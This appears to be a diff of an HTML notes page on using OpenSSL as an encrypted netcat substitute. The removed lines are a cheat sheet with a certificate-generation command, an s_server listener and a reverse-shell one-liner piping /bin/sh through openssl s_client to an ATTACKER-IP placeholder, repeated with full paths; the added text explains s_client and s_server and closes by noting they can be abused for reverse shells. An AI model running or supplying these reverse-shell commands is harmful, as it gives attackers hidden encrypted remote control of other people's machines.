@@ -3,29 +3,24 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Openssl</title>
-</head><body># Generate certificate:<br/>
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes<br/>
-<br/>
-# Listener: <br/>
-openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;<br/>
-<br/>
-# Reverse Shell:<br/>
-mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
-<br/>
-# Full paths<br/>
-/usr/bin/mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | /usr/bin/openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
-<br/>
-<br/>
-<br/>
+</head><body><a href="https://blog.inequationgroup.com/openssl-nc/">https://blog.inequationgroup.com/openssl-nc/</a>&nbsp; <br/>
 <br/>
 Cryptography<br/>
 Before the listener can be started, a key pair and a certificate must be generated.<br/>
 <br/>
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes<br/>
+<br/>
+<b>S_Client</b>, the likeness of nc and OpenSSL client functionality is immediate as the simple command: <br/>
+openssl s_client -quiet -connect [ip]:[port] &nbsp;<br/>
+<br/>
+is equivalent tonc [ip]:[port]. The -quiet flag is necessary as if not the session will be renegotiated if an R ever starts a line in the input.<br/>
 <br/>
 <br/>
-Reverse Shell<br/>
-Listener: openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;<br/>
+<b>S_Server</b>, OpenSSL server functionality is a little bit different from nc's and it's somewhat more difficult to set up as it needs a valid public key certificate, fortunately OpenSSL "main function" is to generate the type of certificate we need. Generating one of these can be easily be done with this command: <br/>
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes <br/>
 <br/>
-Shell: mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
-From sh to bash</body></html>
+this generates a private key into the file key.pem and it writes a cert into the cert.pem file these we can then use to set up the server. To set up the server we can then run openssl: <br/>
+s_server -quiet -key [keyfile] -cert [cert] -port [port] <br/>
+<br/>
+this is equivalent to running nc -lp [ip] [port] as long as we provide a valid keyfile and it's associated public key certificate<br/>
+<br/>
+Knowing this we can easily understand how we can "abuse this" to generate reverse shells</body></html>
